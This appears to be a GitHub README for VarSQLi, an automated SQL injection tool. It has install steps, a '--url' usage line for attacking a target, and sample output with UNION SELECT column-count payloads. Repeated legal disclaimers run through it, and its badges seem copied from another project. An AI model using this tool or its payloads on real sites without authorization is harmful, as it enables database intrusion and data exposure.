- [![.github/workflows/tests.yml](https://github.com/sqlmapproject/sqlmap/actions/workflows/tests.yml/badge.svg)](https://github.com/sqlmapproject/sqlmap/actions/workflows/tests.yml)
- [![Python|3.x](https://img.shields.io/badge/python-3.x-yellow.svg)](https://www.python.org/)
- [![License](https://img.shields.io/badge/license-GPLv1-red.svg)](https://raw.githubusercontent.com/sqlmapproject/sqlmap/master/LICENSE)
- [![Twitter](https://img.shields.io/badge/twitter-@Anonym0us_VNPC-blue.svg)](https://twitter.com/Anonym0us_VNPC)
# Variable-SQL-Injection
### Note From VarSQLi
> - _admin_ : [Twitter](https://twitter.com/Anonym0us_VNPC)
> - _Website_ : [Ghost Man](https://ghostmanews.blogspot.com)
> - _facebook_ : [adonis bertha](https://www.facebook.com/francesca.savino.18?mibextid=ZbWKwL)
> - _Github_ : @Phamchie

VarSQLi allows users to search for and exploit SQL injection vulnerabilities automatically. The tool employs techniques such as input string testing, SQL syntax analysis, and SQL statement testing to determine if a system is susceptible to SQL injection.
> warning: the tool will not have a dump database function, for the sake of protecting other people's private information, and absolutely not used for any other bad purpose, especially exploiting government and school sites  learn
### Screenshot
<img src="https://raw.githubusercontent.com/Phamchie/varsqli/VarSQLi/data/Screenshot_2023-08-02-00-24-06-25.jpg">

However, using VarSQLi or any other database exploitation tool to attack someone else's database is illegal and can have serious consequences. Illegally accessing someone else's database may violate information security regulations and ethical standards in information technology.

> Using VarSQLi or any unauthorized database exploitation tool can lead to imprisonment and criminal liability. We must adhere to security regulations and policies, respect privacy rights, and refrain from compromising others' systems and data.

>> Instead of relying on database exploitation tools, we should focus on enhancing our knowledge of security, understanding common security vulnerabilities, and implementing security measures to protect our systems and data. Collaborating with security experts and complying with legal regulations will ensure safety and ethical use of information technology

### setup - install tool
To set up VarSQLi, follow these steps:

1. Clone the VarSQLi repository from GitHub using the following command:
- `git clone https://github.com/Phamchie/varsqli`
2. Navigate to the VarSQLi directory:
- `cd varsql`
3. Install the required dependencies by running the setup script:
- `python3 setup.py`
- `python3 varsqli.py --help`
> Full Source Setup
```
git clone https://github.com/Phamchie/varsqli/
cd varsqli
python3 setup.py
python3 varsqli.py --help
```
> Once the setup is complete, you can start using VarSQLi to identify and exploit SQL injection vulnerabilities. However, always ensure that you have proper authorization and adhere to legal and ethical guidelines when conducting security assessments.

#### How To Injection - Exploit 
- You can see that in the `--help` section, there is only one mode, `--url` to update the url to attack
```
              ___
 _____         H  _____     _ _  {1.1.5}
|  |  |___ ___[,]|   __|___| |_|
|  |  | .'|  _[(]|__   | . | | | {Pham Chien}
 \___/|__,|_| [)]|_____|_  |_|_|
               V         |_|  ghostmanews.blogspot.com


[+] Remember, using VarSQLi or any similar tool for illegal activities can result in severe legal consequences, including imprisonment. It is crucial to prioritize ethical hacking practices, collaborate with security professionals, and comply with relevant laws and regulations to ensure responsible and lawful use of such tools.

usage: varsqli.py [-h] [--url URL]

VarSQLi - Auto SQL Injection tools

options:
  -h, --help  show this help message and exit
  --url URL   URL Target (ex :
              https://test.com/yourpath_vulnsqli.php?id=1)
```
- To attack the target , you write the command :
-  `python3 varsqli.py --url < url vulerable >`
- the result will be
```
[INFO] Testing connect to target url..
[INFO] Testing IF the target url content is stable
[INFO] Target is the content stable..
[INFO] Testing 'Generic atline queries'..
[INFO] Testing 'UNION SELECT NUMBER COUNT COLUMNS (MySQL Select).'
[INFO] Testing Payload '+AND+0+UNION+SELECT+1,2--+-'
[INFO] Total Response Content HTML stable : 200 OK
[INFO] Testing Payload '+AND+0+UNION+SELECT+1,2,3--+-'
```
<img src="https://raw.githubusercontent.com/Phamchie/varsqli/main/.github/workflows/Screenshot_2023-08-02-14-49-50-36.jpg">

- it is starting to attack, and after a while exploiting with UNION SELECT payloads to get the column number of the website, it will announce like this
> it is the number of columns, payload , target, user , database and the target's MySQL version

<img src="https://raw.githubusercontent.com/Phamchie/varsqli/VarSQLi/.github/workflows/Screenshot_2023-08-02-14-50-17-53.jpg">

- like last version, we don't have the feature to print database name and MySQL user, but i guarantee that the latest update version of too right now will have that feature 😃
> and here is the target database of tables and columns that VarSQLI has exploited
<img src="https://raw.githubusercontent.com/Phamchie/varsqli/main/.github/workflows/Screenshot_2023-08-02-14-50-35-49.jpg">
> so we've come to the end, so what's the ending?

# Ending 
A tip and note to use :
- Can you see how dangerous the SQL injection vulnerability is, here is a piece of advice for you, this tool is only for the nature, is to show the database name, and will never provide  dump database for users only, to ensure the security of network security
> Remember, using VarSQLi or any similar tool for illegal activities can result in severe legal consequences, including imprisonment. It is crucial to prioritize ethical hacking practices, collaborate with security professionals, and comply with relevant laws and regulations to ensure responsible and lawful use of such tools.
# Contact
> - Contact : [phamchienlc06@gmail.com](phamchienlc06@gmail.com)
> - Telegram Channel : [My Channel](https://t.me/Anon0psNews)
> - Telegram : [Adonis Bertha](https://t.me/anonopsvn)
> - website : [website](https://ghostmanews.blogspot.com)
